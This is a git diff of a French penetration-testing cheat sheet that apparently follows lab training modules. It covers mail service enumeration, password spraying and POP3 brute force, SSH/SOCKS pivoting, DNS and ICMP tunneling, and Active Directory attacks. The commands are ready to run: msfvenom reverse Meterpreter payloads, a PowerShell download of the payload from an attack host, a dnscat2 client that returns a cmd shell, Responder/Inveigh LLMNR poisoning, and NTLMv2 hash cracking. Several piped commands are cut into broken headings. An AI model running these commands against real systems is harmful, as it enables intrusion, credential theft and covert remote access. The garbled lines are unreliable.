 `host -t A mail1.inlanefreight.htb.`
-```shell
+```
+
 ### Connexion au serveur SMTP
+
 ```bash
 `telnet 10.10.110.20 25`
-```shell
+```
+
 ### Énumération des utilisateurs SMTP en utilisant la commande RCPT contre l'hôte spécifié
+
 ```bash
 `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`
-```shell
+```
+
 ### Vérifier l'utilisation d'Office365 pour le domaine spécifié
+
 ```bash
 `python3 o365spray.py --validate --domain msplaintext.xyz`
-```shell
+```
+
 ### Énumérer les utilisateurs existants utilisant Office365 sur le domaine spécifié
+
 ```bash
 `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`
-```shell
+```
+
 ### Pulvérisation de mot de passe contre une liste d'utilisateurs utilisant Office365 pour le domaine spécifié
+
 ```bash
 `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`
-```shell
+```
+
 ### Force brute du service POP3
+
 ```bash
 `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`
-```shell
+```
+
 ### Tester le service SMTP pour la vulnérabilité de relais ouvert
+
 ```bash
 `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213`
-```shell
+```
+
+
 # Pivotage, Tunneling et Redirection de Ports
 
 ## Table des matières
-
 1. [Commandes de Base pour l'Analyse Réseau](#commandes-de-base-pour-lanalyse-réseau)
 2. [Tunnels SSH](#tunnels-ssh)
 3. [Proxychains et SOCKS](#proxychains-et-socks)
@@ -1773,293 +2455,428 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 ## Commandes de Base pour l'Analyse Réseau
 
 ### Commande Linux qui affiche toutes les configurations réseau actuelles d'un système.
+
 ```bash
 `ifconfig`
-```shell
+```
+
 ### Commande Windows qui affiche toutes les configurations réseau du système.
+
 ```bash
 `ipconfig`
-```shell
+```
+
 ### Commande utilisée pour afficher la table de routage pour tous les protocoles IPv4.
+
 ```bash
 `netstat -r`
-```shell
-### Affiche toutes (-a) les connexions réseau actives avec les IDs de processus associés. -t affiche uniquement les connexions TCP, -n affiche uniquement les adresses numériques, -p affiche les IDs de processus associés à chaque connexion.
+```
+
+### Affiche toutes (`-a`) les connexions réseau actives avec les IDs de processus associés. `-t` affiche uniquement les connexions TCP, `-n` affiche uniquement les adresses numériques, `-p` affiche les IDs de processus associés à chaque connexion.
+
 ```bash
 `netstat -antp`
-```shell
+```
+
 ### Commande Nmap utilisée pour scanner une cible à la recherche de ports ouverts permettant des connexions SSH ou MySQL.
+
 ```bash
 `nmap -sT -p22,3306 <AdresseIPduCible>`
-```shell
+```
+
 ## Tunnels SSH
 
-### Commande SSH utilisée pour créer un tunnel SSH depuis une machine locale sur le port local 1234 vers une cible distante utilisant le port 3306.
+### Commande SSH utilisée pour créer un tunnel SSH depuis une machine locale sur le port local `1234` vers une cible distante utilisant le port 3306.
+
 ```bash
 `ssh -L 1234:localhost:3306 Ubuntu@<AdresseIPduCible>`
-```shell
-### grep 1234
+```
+
+### grep 1234`
+
 ```bash
 `netstat -antp \
-```shell
-### Commande Nmap utilisée pour scanner un hôte via une connexion établie sur le port local 1234.
+```
+
+### Commande Nmap utilisée pour scanner un hôte via une connexion établie sur le port local `1234`.
+
 ```bash
 `nmap -v -sV -p1234 localhost`
-```shell
-### Commande SSH qui demande au client ssh de demander au serveur SSH de transférer toutes les données via le port 1234 vers localhost:3306.
+```
+
+### Commande SSH qui demande au client ssh de demander au serveur SSH de transférer toutes les données via le port `1234` vers `localhost:3306`.
+
 ```bash
 `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<AdresseIPduCible>`
-```shell
-### Commande SSH utilisée pour effectuer une redirection de port dynamique sur le port 9050 et établir un tunnel SSH avec la cible. Cela fait partie de la configuration d'un proxy SOCKS.
+```
+
+### Commande SSH utilisée pour effectuer une redirection de port dynamique sur le port `9050` et établir un tunnel SSH avec la cible. Cela fait partie de la configuration d'un proxy SOCKS.
+
 ```bash
 `ssh -D 9050 ubuntu@<AdresseIPduCible>`
-```shell
-### Commande SSH utilisée pour créer un tunnel SSH inverse d'une cible vers un hôte d'attaque. Le trafic est transféré sur le port 8080 sur l'hôte d'attaque vers le port 80 sur la cible.
+```
+
+### Commande SSH utilisée pour créer un tunnel SSH inverse d'une cible vers un hôte d'attaque. Le trafic est transféré sur le port `8080` sur l'hôte d'attaque vers le port `80` sur la cible.
+
 ```bash
 `ssh -R <IPInterneDuHôtePivot>:8080:0.0.0.0:80 ubuntu@<AdresseIPduCible> -vN`
-```shell
+```
+
 ## Proxychains et SOCKS
 
 ### Commande Linux utilisée pour afficher les 4 dernières lignes de /etc/proxychains.conf. Peut être utilisée pour s'assurer que les configurations socks sont en place.
+
 ```bash
 `tail -4 /etc/proxychains.conf`
-```shell
-### Utilisé pour envoyer le trafic généré par un scan Nmap via Proxychains et un proxy SOCKS. Le scan est effectué contre les hôtes dans la plage spécifiée 172.16.5.1-200 avec une verbosité accrue (-v) désactivant le scan ping (-sn).
+```
+
+### Utilisé pour envoyer le trafic généré par un scan Nmap via Proxychains et un proxy SOCKS. Le scan est effectué contre les hôtes dans la plage spécifiée `172.16.5.1-200` avec une verbosité accrue (`-v`) désactivant le scan ping (`-sn`).
+
 ```bash
 `proxychains nmap -v -sn 172.16.5.1-200`
-```shell
-### Utilisé pour envoyer le trafic généré par un scan Nmap via Proxychains et un proxy SOCKS. Le scan est effectué contre 172.16.5.19 avec une verbosité accrue (-v), désactivant la découverte ping (-Pn), et en utilisant le type de scan TCP connect (-sT).
+```
+
+### Utilisé pour envoyer le trafic généré par un scan Nmap via Proxychains et un proxy SOCKS. Le scan est effectué contre 172.16.5.19 avec une verbosité accrue (`-v`), désactivant la découverte ping (`-Pn`), et en utilisant le type de scan TCP connect (`-sT`).
+
 ```bash
 `proxychains nmap -v -Pn -sT 172.16.5.19`
-```shell
+```
+
 ### Utilise Proxychains pour ouvrir Metasploit et envoyer tout le trafic réseau généré via un proxy SOCKS.
+
 ```bash
 `proxychains msfconsole`
-```shell
+```
+
 ### Utilisé pour se connecter à une cible en utilisant RDP et un ensemble d'identifiants via proxychains. Cela enverra tout le trafic via un proxy SOCKS.
+
 ```bash
 `proxychains xfreerdp /v:<AdresseIPduCible> /u:victor /p:pass@123`
-```shell
+```
+
 ### Ouvre firefox avec Proxychains et envoie la requête web via un serveur proxy SOCKS vers le serveur web de destination spécifié.
+
 ```bash
 `proxychains firefox-esr <AdresseIPduServeurWebCible>:80`
-```shell
+```
+
 ### Ligne de texte qui doit être ajoutée à /etc/proxychains.conf pour garantir qu'un proxy SOCKS version 4 est utilisé en combinaison avec proxychains sur l'adresse IP et le port spécifiés.
+
 ```bash
 `socks4 127.0.0.1 9050`
-```shell
+```
+
 ### Ligne de texte qui doit être ajoutée à /etc/proxychains.conf pour garantir qu'un proxy SOCKS version 5 est utilisé en combinaison avec proxychains sur l'adresse IP et le port spécifiés.
+
 ```bash
 `Socks5 127.0.0.1 1080`
-```shell
+```
+
 ## Transfert de Fichiers et Payload
 
-### Utilise msfvenom pour générer un payload Meterpreter reverse HTTPS Windows qui enverra un rappel à l'adresse IP spécifiée après lhost= sur le port local 8080 (LPORT=8080). Le payload prendra la forme d'un fichier exécutable appelé backupscript.exe.
+### Utilise msfvenom pour générer un payload Meterpreter reverse HTTPS Windows qui enverra un rappel à l'adresse IP spécifiée après `lhost=` sur le port local 8080 (`LPORT=8080`). Le payload prendra la forme d'un fichier exécutable appelé `backupscript.exe`.
+
 ```bash
 `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <IPInterneDuHôtePivot> -f exe -o backupscript.exe LPORT=8080`
-```shell
+```
+
 ### Utilisé pour sélectionner le module d'exploit multi-handler dans Metasploit.
+
 ```bash
 `msf6 > use exploit/multi/handler`
-```shell
-### Utilise le protocole de copie sécurisée (scp) pour transférer le fichier backupscript.exe vers l'hôte spécifié et le place dans le répertoire personnel de l'utilisateur Ubuntu (:~/).
+```
+
+### Utilise le protocole de copie sécurisée (`scp`) pour transférer le fichier `backupscript.exe` vers l'hôte spécifié et le place dans le répertoire personnel de l'utilisateur Ubuntu (`:~/`).
+
 ```bash
 `scp backupscript.exe ubuntu@<AdresseIPduCible>:~/`
-```shell
-### Utilise Python3 pour démarrer un serveur HTTP simple écoutant sur le port 8123. Peut être utilisé pour récupérer des fichiers depuis un hôte.
+```
+
+### Utilise Python3 pour démarrer un serveur HTTP simple écoutant sur le port `8123`. Peut être utilisé pour récupérer des fichiers depuis un hôte.
+
 ```bash
 `python3 -m http.server 8123`
-```shell
-### Commande PowerShell utilisée pour télécharger un fichier appelé backupscript.exe depuis un serveur web (172.16.5.129:8123) puis enregistrer le fichier à l'emplacement spécifié après -OutFile.
+```
+
+### Commande PowerShell utilisée pour télécharger un fichier appelé backupscript.exe depuis un serveur web (`172.16.5.129:8123`) puis enregistrer le fichier à l'emplacement spécifié après `-OutFile`.
+
 ```bash
 `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`
-```shell
-### Utilise msfveom pour générer un payload Linux Meterpreter reverse TCP qui rappelle l'IP spécifiée après LHOST= sur le port 8080 (LPORT=8080). Le payload prend la forme d'un fichier exécutable elf appelé backupjob.
+```
+
+### Utilise msfveom pour générer un payload Linux Meterpreter reverse TCP qui rappelle l'IP spécifiée après `LHOST=` sur le port 8080 (`LPORT=8080`). Le payload prend la forme d'un fichier exécutable elf appelé backupjob.
+
 ```bash
 `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<AdresseIPdHôteAttaque -f elf -o backupjob LPORT=8080`
-```shell
+```
+
 ### Utilise le protocole de copie sécurisée pour transférer un répertoire entier et tout son contenu vers une cible spécifiée.
+
 ```bash
 `scp -r rpivot ubuntu@<AdresseIPDuCible>`
-```shell
+```
+
 ## Découverte de Réseau
 
-### grep "bytes from" &) ;done
+### grep "bytes from" &) ;done`
+
 ```bash
 `for i in {1..254} ;do (ping -c 1 172.16.5.$i \
-```shell
-### find "Reply"
+```
+
+### find "Reply"`
+
 ```bash
 `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \
-```shell
-### % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+```
+
+### % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`
+
 ```bash
 `1..254 \
-```shell
-### Commande Metasploit qui exécute un module de ping sweep contre le segment réseau spécifié (RHOSTS=172.16.5.0/23).
+```
+
+### Commande Metasploit qui exécute un module de ping sweep contre le segment réseau spécifié (`RHOSTS=172.16.5.0/23`).
+
 ```bash
 `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`
-```shell
+```
+
 ## Port Forwarding avec Meterpreter
 
 ### Commande Meterpreter utilisée pour afficher les fonctionnalités de la commande portfwd.
+
 ```bash
 `meterpreter > help portfwd`
-```shell
+```
+
 ### Commande portfwd basée sur Meterpreter qui ajoute une règle de transfert à la session Meterpreter actuelle. Cette règle transfère le trafic réseau sur le port 3300 de la machine locale vers le port 3389 (RDP) sur la cible.
+
 ```bash
 `meterpreter > portfwd add -l 3300 -p 3389 -r <AdresseIPduCible>`
-```shell
+```
+
 ### Utilise xfreerdp pour se connecter à un hôte distant via localhost:3300 en utilisant un ensemble d'identifiants. Des règles de redirection de port doivent être en place pour que cela fonctionne correctement.
+
 ```bash
 `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`
-```shell
-### Commande portfwd basée sur Meterpreter qui ajoute une règle de transfert qui dirige le trafic entrant sur le port 8081 vers le port 1234 écoutant sur l'adresse IP de l'hôte d'attaque.
+```
+
+### Commande portfwd basée sur Meterpreter qui ajoute une règle de transfert qui dirige le trafic entrant sur le port 8081 vers le port `1234` écoutant sur l'adresse IP de l'hôte d'attaque.
+
 ```bash
 `meterpreter > portfwd add -R -l 8081 -p 1234 -L <AdresseIPdHôteAttaque>`
-```shell
+```
+
 ### Commande basée sur Meterpreter utilisée pour exécuter la session metepreter sélectionnée en arrière-plan. Similaire à la mise en arrière-plan d'un processus sous Linux.
+
 ```bash
 `meterpreter > bg`
-```shell
+```
+
 ## Outils Spécialisés
 
-### Commande Metasploit qui sélectionne le module auxiliaire socks_proxy.
+### Commande Metasploit qui sélectionne le module auxiliaire `socks_proxy`.
+
 ```bash
 `msf6 > use auxiliary/server/socks_proxy`
-```shell
+```
+
 ### Commande Metasploit qui liste tous les jobs en cours d'exécution.
+
 ```bash
 `msf6 auxiliary(server/socks_proxy) > jobs`
-```shell
+```
+
 ### Commande Metasploit utilisée pour sélectionner le module autoroute.
+
 ```bash
 `msf6 > use post/multi/manage/autoroute`
-```shell
+```
+
 ### Utilise Socat pour écouter sur le port 8080 puis faire un fork lorsque la connexion est reçue. Il se connectera ensuite à l'hôte d'attaque sur le port 80.
+
 ```bash
 `socat TCP4-LISTEN:8080,fork TCP4:<AdresseIPdHôteAttaque>:80`
-```shell
+```
+
 ### Utilise Socat pour écouter sur le port 8080 puis faire un fork lorsque la connexion est reçue. Ensuite, il se connectera à l'hôte cible sur le port 8443.
+
 ```bash
 `socat TCP4-LISTEN:8080,fork TCP4:<AdresseIPduCible>:8443`
-```shell
+```
+
 ### Commande Windows qui utilise Plink.exe de PuTTY pour effectuer une redirection de port SSH dynamique et établit un tunnel SSH avec la cible spécifiée. Cela permettra le chaînage de proxy sur un hôte Windows, similaire à ce qui est fait avec Proxychains sur un hôte Linux.
+
 ```bash
 `plink -D 9050 ubuntu@<AdresseIPduCible>`
-```shell
+```
+
 ### Utilise apt-get pour installer l'outil sshuttle.
+
 ```bash
 `sudo apt-get install sshuttle`
-```shell
-### Exécute sshuttle, se connecte à l'hôte cible et crée une route vers le réseau 172.16.5.0 pour que le trafic puisse passer de l'hôte d'attaque aux hôtes sur le réseau interne (172.16.5.0).
+```
+
+### Exécute sshuttle, se connecte à l'hôte cible et crée une route vers le réseau 172.16.5.0 pour que le trafic puisse passer de l'hôte d'attaque aux hôtes sur le réseau interne (`172.16.5.0`).
+
 ```bash
 `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`
-```shell
+```
+
 ### Clone le dépôt GitHub du projet rpivot.
+
 ```bash
 `sudo git clone https://github.com/klsecservices/rpivot.git`
-```shell
+```
+
 ### Utilise apt-get pour installer python2.7.
+
 ```bash
 `sudo apt-get install python2.7`
-```shell
-### Utilisé pour exécuter le serveur rpivot (server.py) sur le port proxy 9050, le port serveur 9999 et écoutant sur n'importe quelle adresse IP (0.0.0.0).
+```
+
+### Utilisé pour exécuter le serveur rpivot (`server.py`) sur le port proxy `9050`, le port serveur `9999` et écoutant sur n'importe quelle adresse IP (`0.0.0.0`).
+
 ```bash
 `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
-```shell
-### Utilisé pour exécuter le client rpivot (client.py) pour se connecter au serveur rpivot spécifié sur le port approprié.
+```
+
+### Utilisé pour exécuter le client rpivot (`client.py`) pour se connecter au serveur rpivot spécifié sur le port approprié.
+
 ```bash
 `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`
-```shell
-### Utilisé pour démarrer un serveur chisel en mode verbose écoutant sur le port 1234 en utilisant SOCKS version 5.
+```
+
+### Utilisé pour démarrer un serveur chisel en mode verbose écoutant sur le port `1234` en utilisant SOCKS version 5.
+
 ```bash
 `./chisel server -v -p 1234 --socks5`
-```shell
+```
+
 ### Utilisé pour se connecter à un serveur chisel à l'adresse IP et au port spécifiés en utilisant des socks.
+
 ```bash
 `./chisel client -v 10.129.202.64:1234 socks`
-```shell
+```
+
 ## Tunneling DNS et ICMP
 
-### Clone le dépôt GitHub du projet dnscat2.
+### Clone le dépôt GitHub du projet `dnscat2`.
+
 ```bash
 `git clone https://github.com/iagox86/dnscat2.git`
-```shell
-### Utilisé pour démarrer le serveur dnscat2.rb s'exécutant sur l'adresse IP spécifiée, le port (53) et utilisant le domaine inlanefreight.local avec l'option no-cache activée.
+```
+
+### Utilisé pour démarrer le serveur dnscat2.rb s'exécutant sur l'adresse IP spécifiée, le port (`53`) et utilisant le domaine `inlanefreight.local` avec l'option no-cache activée.
+
 ```bash
 `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`
-```shell
+```
+
 ### Clone le dépôt Github du projet dnscat2-powershell.
+
 ```bash
 `git clone https://github.com/lukebaggett/dnscat2-powershell.git`
-```shell
+```
+
 ### Commande PowerShell utilisée pour importer l'outil dnscat2.ps1.
+
 ```bash
 `Import-Module dnscat2.ps1`
-```shell
-### Commande PowerShell utilisée pour se connecter à un serveur dnscat2 spécifié en utilisant une adresse IP, un nom de domaine et un secret prépartagé. Le client renverra une connexion shell au serveur (-Exec cmd).
+```
+
+### Commande PowerShell utilisée pour se connecter à un serveur dnscat2 spécifié en utilisant une adresse IP, un nom de domaine et un secret prépartagé. Le client renverra une connexion shell au serveur (`-Exec cmd`).
+
 ```bash
 `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`
-```shell
+```
+
 ### Utilisé pour lister les options dnscat2.
+
 ```bash
 `dnscat2> ?`
-```shell
+```
+
 ### Utilisé pour interagir avec une session dnscat2 établie.
+
 ```bash
 `dnscat2> window -i 1`
-```shell
+```
+
 ### Clone le dépôt GitHub du projet ptunnel-ng.
+
 ```bash
 `git clone https://github.com/utoni/ptunnel-ng.git`
-```shell
+```
+
 ### Utilisé pour exécuter le script shell autogen.sh qui construira les fichiers ptunnel-ng nécessaires.
+
 ```bash
 `sudo ./autogen.sh`
-```shell
-### Utilisé pour démarrer le serveur ptunnel-ng sur l'adresse IP spécifiée (-r) et le port correspondant (-R22).
+```
+
+### Utilisé pour démarrer le serveur ptunnel-ng sur l'adresse IP spécifiée (`-r`) et le port correspondant (`-R22`).
+
 ```bash
 `sudo ./ptunnel-ng -r10.129.202.64 -R22`
-```shell
-### Utilisé pour se connecter à un serveur ptunnel-ng spécifié via le port local 2222 (-l2222).
+```
+
+### Utilisé pour se connecter à un serveur ptunnel-ng spécifié via le port local 2222 (`-l2222`).
+
 ```bash
 `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`
-```shell
+```
+
 ### Commande SSH utilisée pour se connecter à un serveur SSH via un port local. Cela peut être utilisé pour tunneler le trafic SSH à travers un tunnel ICMP.
+
 ```bash
 `ssh -p2222 -lubuntu 127.0.0.1`
-```shell
+```
+
 ## Solutions Windows
 
-### Recherche Metasploit qui tente de trouver un module appelé rdp_scanner.
+### Recherche Metasploit qui tente de trouver un module appelé `rdp_scanner`.
+
 ```bash
 `msf6 > search rdp_scanner`
-```shell
+```
+
 ### Commande Windows utilisée pour enregistrer le SocksOverRDP-PLugin.dll.
+
 ```bash
 `regsvr32.exe SocksOverRDP-Plugin.dll`
-```shell
-### findstr 1080
+```
+
+### findstr 1080`
+
 ```bash
 `netstat -antb \
-```shell
+```
+
 ### Utilisé pour exécuter le client rpivot pour se connecter à un serveur web qui utilise HTTP-Proxy avec authentification NTLM.
+
 ```bash
 `python client.py --server-ip <AdresseIPduServeurWebCible> --server-port 8080 --ntlm-proxy-ip AdresseIPduProxy> --ntlm-proxy-port 8081 --domain <nomduDomaineWindows> --username <nomutilisateur> --password <motdepasse>`
-```shell
-### Commande Windows qui utilise netsh.exe pour configurer une règle portproxy appelée v4tov4 qui écoute sur le port 8080 et transfère les connexions vers la destination 172.16.5.25 sur le port 3389.
+```
+
+### Commande Windows qui utilise `netsh.exe` pour configurer une règle portproxy appelée `v4tov4` qui écoute sur le port 8080 et transfère les connexions vers la destination 172.16.5.25 sur le port 3389.
+
 ```bash
 `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`
-```shell
+```
+
 ### Commande Windows utilisée pour afficher les configurations d'une règle portproxy appelée v4tov4.
+
 ```bash
 `netsh.exe interface portproxy show v4tov4`
-```shell
+```
+
+
+
 # Active Directory
 
 ## Table des matières
-
 1. [Énumération Initiale](#énumération-initiale)
 2. [Empoisonnement LLMNR/NTB-NS](#empoisonnement-llmnrntb-ns)
 3. [Pulvérisation de Mots de Passe et Politiques de Mots de Passe](#pulvérisation-de-mots-de-passe-et-politiques-de-mots-de-passe)
@@ -2067,435 +2884,639 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 ## Énumération Initiale
 
 ### Utilisée pour interroger le système de noms de domaine et découvrir la correspondance entre l'adresse IP et le nom de domaine de la cible entrée depuis un hôte basé sur Linux.
+
 ```bash
 `nslookup ns1.inlanefreight.com`
-```shell
-### Utilisée pour commencer à capturer des paquets réseau sur l'interface réseau suivant l'option -i sur un hôte basé sur Linux.
+```
+
+### Utilisée pour commencer à capturer des paquets réseau sur l'interface réseau suivant l'option `-i` sur un hôte basé sur Linux.
+
 ```bash
 `sudo tcpdump -i ens224`
-```shell
-### Utilisée pour commencer à répondre et à analyser les requêtes LLMNR, NBT-NS et MDNS sur l'interface spécifiée après l'option -I et fonctionnant en mode Analyse Passive, activé avec -A. Exécutée depuis un hôte basé sur Linux.
+```
+
+### Utilisée pour commencer à répondre et à analyser les requêtes `LLMNR`, `NBT-NS` et `MDNS` sur l'interface spécifiée après l'option `-I` et fonctionnant en mode `Analyse Passive`, activé avec `-A`. Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `sudo responder -I ens224 -A`
-```shell
+```
+
 ### Effectue un balayage ping sur le segment de réseau spécifié depuis un hôte basé sur Linux.
+
 ```bash
 `fping -asgq 172.16.5.0/23`
-```shell
-### Effectue un scan nmap avec détection du système d'exploitation, détection de version, analyse de scripts et traceroute activés (-A) basé sur une liste d'hôtes (hosts.txt) spécifiée dans le fichier suivant -iL. Puis enregistre les résultats du scan dans le fichier spécifié après l'option -oN. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Effectue un scan nmap avec détection du système d'exploitation, détection de version, analyse de scripts et traceroute activés (`-A`) basé sur une liste d'hôtes (`hosts.txt`) spécifiée dans le fichier suivant `-iL`. Puis enregistre les résultats du scan dans le fichier spécifié après l'option `-oN`. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum`
-```shell
-### Utilise git pour cloner l'outil kerbrute depuis un hôte basé sur Linux.
+```
+
+### Utilise `git` pour cloner l'outil kerbrute depuis un hôte basé sur Linux.
+
 ```bash
 `sudo git clone https://github.com/ropnop/kerbrute.git`
-```shell
-### Utilisée pour lister les options de compilation possibles avec make depuis un hôte basé sur Linux.
+```
+
+### Utilisée pour lister les options de compilation possibles avec `make` depuis un hôte basé sur Linux.
+
 ```bash
 `make help`
-```shell
-### Utilisée pour compiler un binaire Kerbrute pour plusieurs plateformes OS et architectures CPU.
+```
+
+### Utilisée pour compiler un binaire `Kerbrute` pour plusieurs plateformes OS et architectures CPU.
+
 ```bash
 `sudo make all`
-```shell
-### Utilisée pour tester le binaire Kebrute compilé choisi depuis un hôte basé sur Linux.
+```
+
+### Utilisée pour tester le binaire `Kebrute` compilé choisi depuis un hôte basé sur Linux.
+
 ```bash
 `./kerbrute_linux_amd64`
-```shell
-### Utilisée pour déplacer le binaire Kerbrute dans un répertoire qui peut être défini dans le chemin d'un utilisateur Linux. Facilitant l'utilisation de l'outil.
+```
+
+### Utilisée pour déplacer le binaire `Kerbrute` dans un répertoire qui peut être défini dans le chemin d'un utilisateur Linux. Facilitant l'utilisation de l'outil.
+
 ```bash
 `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`
-```shell
-### Exécute l'outil Kerbrute pour découvrir les noms d'utilisateurs dans le domaine (INLANEFREIGHT.LOCAL) spécifié après l'option -d et le contrôleur de domaine associé spécifié après --dc en utilisant une liste de mots et enregistre (-o) les résultats dans un fichier spécifié. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Exécute l'outil Kerbrute pour découvrir les noms d'utilisateurs dans le domaine (`INLANEFREIGHT.LOCAL`) spécifié après l'option `-d` et le contrôleur de domaine associé spécifié après `--dc` en utilisant une liste de mots et enregistre (`-o`) les résultats dans un fichier spécifié. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results`
-```shell
+```
+
 ## Empoisonnement LLMNR/NTB-NS
 
-### Utilisée pour afficher les instructions d'utilisation et les diverses options disponibles dans Responder depuis un hôte basé sur Linux.
+### Utilisée pour afficher les instructions d'utilisation et les diverses options disponibles dans `Responder` depuis un hôte basé sur Linux.
+
 ```bash
 `responder -h`
-```shell
-### Utilise hashcat pour cracker les hash NTLMv2 (-m) qui ont été capturés par responder et sauvegardés dans un fichier (frond_ntlmv2). Le craquage est effectué sur la base d'une liste de mots spécifiée.
+```
+
+### Utilise `hashcat` pour cracker les hash `NTLMv2` (`-m`) qui ont été capturés par responder et sauvegardés dans un fichier (`frond_ntlmv2`). Le craquage est effectué sur la base d'une liste de mots spécifiée.
+
 ```bash
 `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`
-```shell
-### Utilise le cmdlet Import-Module de PowerShell pour importer l'outil basé sur Windows Inveigh.ps1.
+```
+
+### Utilise le cmdlet `Import-Module` de PowerShell pour importer l'outil basé sur Windows `Inveigh.ps1`.
+
 ```bash
 `Import-Module .\Inveigh.ps1`
-```shell
-### Utilisée pour afficher de nombreuses options et fonctionnalités disponibles avec Invoke-Inveigh. Exécutée depuis un hôte basé sur Windows.
+```
+
+### Utilisée pour afficher de nombreuses options et fonctionnalités disponibles avec `Invoke-Inveigh`. Exécutée depuis un hôte basé sur Windows.
+
 ```bash
 `(Get-Command Invoke-Inveigh).Parameters`
-```shell
-### Démarre Inveigh sur un hôte basé sur Windows avec l'usurpation LLMNR et NBNS activée et enregistre les résultats dans un fichier.
+```
+
+### Démarre `Inveigh` sur un hôte basé sur Windows avec l'usurpation LLMNR et NBNS activée et enregistre les résultats dans un fichier.
+
 ```bash
 `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
-```shell
-### Démarre l'implémentation C# d'Inveigh depuis un hôte basé sur Windows.
+```
+
+### Démarre l'implémentation `C#` d'`Inveigh` depuis un hôte basé sur Windows.
+
 ```bash
 `.\Inveigh.exe`
-```shell
-### foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
+```
+
+### foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}`
+
 ```bash
 `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \
-```shell
+```
+
 ## Pulvérisation de Mots de Passe et Politiques de Mots de Passe
 
-### Script Bash utilisé pour générer 16,079,616 combinaisons de noms d'utilisateurs possibles depuis un hôte basé sur Linux.
+### Script Bash utilisé pour générer `16,079,616` combinaisons de noms d'utilisateurs possibles depuis un hôte basé sur Linux.
+
 ```bash
 `#!/bin/bash for x in {A..Z}{A..Z}{A..Z}{A..Z} do echo $x; done`
-```shell
-### Utilise CrackMapExec et des identifiants valides (avazquez:Password123) pour énumérer la politique de mot de passe (--pass-pol) depuis un hôte basé sur Linux.
+```
+
+### Utilise `CrackMapExec` et des identifiants valides (`avazquez:Password123`) pour énumérer la politique de mot de passe (`--pass-pol`) depuis un hôte basé sur Linux.
+
 ```bash
 `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`
-```shell
-### Utilise rpcclient pour découvrir des informations sur le domaine via des sessions SMB NULL. Exécutée depuis un hôte basé sur Linux.
+```
+
+### Utilise `rpcclient` pour découvrir des informations sur le domaine via des sessions `SMB NULL`. Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `rpcclient -U "" -N 172.16.5.5`
-```shell
-### Utilise rpcclient pour énumérer la politique de mot de passe dans un domaine Windows cible depuis un hôte basé sur Linux.
+```
+
+### Utilise `rpcclient` pour énumérer la politique de mot de passe dans un domaine Windows cible depuis un hôte basé sur Linux.
+
 ```bash
 `rpcclient $> querydominfo`
-```shell
-### Utilise enum4linux pour énumérer la politique de mot de passe (-P) dans un domaine Windows cible depuis un hôte basé sur Linux.
+```
+
+### Utilise `enum4linux` pour énumérer la politique de mot de passe (`-P`) dans un domaine Windows cible depuis un hôte basé sur Linux.
+
 ```bash
 `enum4linux -P 172.16.5.5`
-```shell
-### Utilise enum4linux-ng pour énumérer la politique de mot de passe (-P) dans un domaine Windows cible depuis un hôte basé sur Linux, puis présente la sortie en YAML et JSON sauvegardée dans un fichier après l'option -oA.
+```
+
+### Utilise `enum4linux-ng` pour énumérer la politique de mot de passe (`-P`) dans un domaine Windows cible depuis un hôte basé sur Linux, puis présente la sortie en YAML et JSON sauvegardée dans un fichier après l'option `-oA`.
+
 ```bash
 `enum4linux-ng -P 172.16.5.5 -oA ilfreight`
-```shell
-### grep -m 1 -B 10 pwdHistoryLength
+```
+
+### grep -m 1 -B 10 pwdHistoryLength`
+
 ```bash
 `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \
-```shell
+```
+
 ### Utilisée pour énumérer la politique de mot de passe dans un domaine Windows depuis un hôte basé sur Windows.
+
 ```bash
 `net accounts`
-```shell
-### Utilise le cmdlet Import-Module pour importer l'outil PowerView.ps1 depuis un hôte basé sur Windows.
+```
+
